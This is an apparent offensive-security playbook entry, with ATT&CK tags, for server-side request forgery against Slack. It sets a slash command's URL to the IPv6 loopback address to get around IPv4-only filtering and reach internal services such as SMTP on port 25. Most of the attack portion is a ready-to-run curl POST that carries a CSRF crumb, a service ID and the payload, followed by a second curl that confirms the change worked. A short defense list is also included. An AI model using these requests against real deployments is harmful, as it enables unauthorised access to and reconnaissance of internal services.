---
tags:
  - ssrf
  - ipv6
  - slack
  - slash-command
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/configure-slack-ssrf-slash-command]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.374Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: dd0e5051-08e3-4b8f-945e-cbd2d00f2a25
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Configure-Slack-Slash-Command-for-SSRF-via-IPv6

## Summary

This procedure configures a Slack slash command integration to use an IPv6 loopback URL (e.g., http://[::]:25/), bypassing SSRF protections that only block IPv4 internal ranges, allowing subsequent backend requests to internal services.

## Description

In Slack's integration settings, the URL parameter for slash commands is processed by the backend without IPv6 loopback filtering. By editing an existing command like /ssrf, attackers with integration access can set the URL to target internal ports, enabling SSRF to loopback services bound to IPv6. This is useful in authenticated scenarios for internal reconnaissance. Prerequisites include a valid CSRF crumb and service ID.

## Requirements

1. Access to Slack workspace admin or integration editing privileges
2. Valid CSRF crumb token (e.g., from session)
3. Service ID for the slash command (e.g., /services/4814366410)

## Defense

Defensive measures and detection strategies:

- Whitelist URLs or implement IPv6-specific filtering in SSRF protections
- Monitor integration configuration changes for suspicious URLs (e.g., [::])
- Disable or audit third-party integrations regularly

## Objectives

1. Update slash command URL to IPv6 loopback endpoint
2. Enable SSRF payload for internal port targeting
3. Prepare for execution to access services like SMTP on port 25

## Instructions

### Step 1: Prepare the Configuration Request

**Context**: Gather the service ID and CSRF crumb from Slack's integration page, then craft the POST request to update the URL.

**Command** ([[commands/configure-slack-ssrf-slash-command]]):
```bash
curl -X POST https://agarri.slack.com/services/4814366410 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "crumb=s-1431286469-c73f073ed6-%E2%98%83&edit_service=1&is_edit=1&command=/ssrf&url=http://[::]:25/&method=GET&in_autocomplete=on&desc=&usage=&label="
```

> This command sends a form-encoded POST to the services endpoint, setting the URL to target port 25. Expected output is a 200 OK with updated configuration; verify by checking the integration settings.

### Step 2: Verify Configuration

**Context**: Reload the integration page to confirm the URL change without triggering SSRF yet.

**Command** (Manual browser check or GET request):
```bash
curl -X GET https://agarri.slack.com/services/4814366410
```

> Inspect the response for the updated URL parameter. Success if http://[::]:25/ is reflected.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- None

## Commands Used

- [[commands/configure-slack-ssrf-slash-command]]

## Tools Used

- None

## Tags

- [[ssrf]]
- [[ipv6]]
- [[slack]]
